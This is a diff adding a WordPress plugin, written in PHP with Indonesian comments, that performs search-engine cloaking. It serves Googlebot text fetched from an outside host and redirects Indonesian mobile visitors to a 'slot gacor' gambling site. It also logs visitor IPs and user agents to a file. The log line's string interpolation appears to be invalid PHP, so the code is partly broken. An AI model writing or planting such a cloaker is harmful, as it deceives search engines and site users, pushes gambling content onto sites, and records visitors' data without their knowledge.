@@ -1,0 +1,87 @@
+<?php
+/*
+Plugin Name: Custom Cloaker
+Description: Cloaking berbasis negara, device, Googlebot, dengan logging dan path tertentu.
+Version: 1.1
+Author: ChatGPT
+*/
+
+add_action('init', 'custom_cloaker_init', 0);
+
+function custom_cloaker_init() {
+    if (is_admin() || (defined('DOING_AJAX') && DOING_AJAX)) return;
+
+    // CLOAKING PATHS YANG DIIZINKAN
+    $allowed_paths = ['/', '/slot-gacor/', '/promo/slot/']; 
+    $current_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+    if (!in_array($current_path, $allowed_paths)) return;
+
+    $ip         = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+    $userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $isMobile   = preg_match('/Mobile|Android|iPhone|iPad/i', $userAgent);
+    $isGooglebot = preg_match('/Googlebot|Googlebot-Mobile|Googlebot-Image/i', $userAgent);
+
+    $countryKey = 'geo_' . md5($ip);
+    $country = get_transient($countryKey);
+    if (!$country) {
+        $country = get_country_by_ip($ip);
+        set_transient($countryKey, $country, 12 * HOUR_IN_SECONDS);
+    }
+
+    $desktopUrl = 'https://added-cloud.cc/packdol/getcontent/prokaltim/slot-gacor.txt';
+    $mobileUrl  = 'https://slot-gacor-penuh-misteri.web.app/';
+
+    if ($isGooglebot) {
+        log_cloak_event('Googlebot Serve', ['country'=>$country, 'device'=>($isMobile ? 'Mobile' : 'Desktop')]);
+        $content = fetch_external_content($desktopUrl);
+        if ($content) {
+            echo $content;
+            exit;
+        }
+    } elseif ($country === 'Indonesia') {
+        if ($isMobile) {
+            log_cloak_event('Redirect Mobile', ['country'=>$country, 'device'=>'Mobile']);
+            wp_redirect($mobileUrl);
+            exit;
+        } else {
+            log_cloak_event('Serve Desktop Content', ['country'=>$country, 'device'=>'Desktop']);
+            $content = fetch_external_content($desktopUrl);
+            if ($content) {
+                echo $content;
+                exit;
+            }
+        }
+    }
+}
+
+function get_country_by_ip($ip) {
+    $api = "http://ip-api.com/json/{$ip}";
+    $response = wp_remote_get($api, ['timeout' => 3]);
+
+    if (is_wp_error($response)) return 'Unknown';
+
+    $body = wp_remote_retrieve_body($response);
+    $data = json_decode($body, true);
+
+    if (isset($data['status']) && $data['status'] === 'success' && isset($data['country'])) {
+        return $data['country'];
+    }
+
+    return 'Unknown';
+}
+
+function fetch_external_content($url) {
+    $response = wp_remote_get($url, ['timeout' => 5]);
+    if (is_wp_error($response)) return null;
+    return wp_remote_retrieve_body($response);
+}
+
+function log_cloak_event($type, $info = []) {
+    $logfile = WP_CONTENT_DIR . '/cloak-log.txt';
+    $timestamp = current_time('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
+
+    $entry = "[{$timestamp}] {$type} | IP: {$ip} | Country: {$info['country'] ?? 'N/A'} | Device: {$info['device'] ?? 'N/A'} | UA: {$ua}" . PHP_EOL;
+    file_put_contents($logfile, $entry, FILE_APPEND);
+}
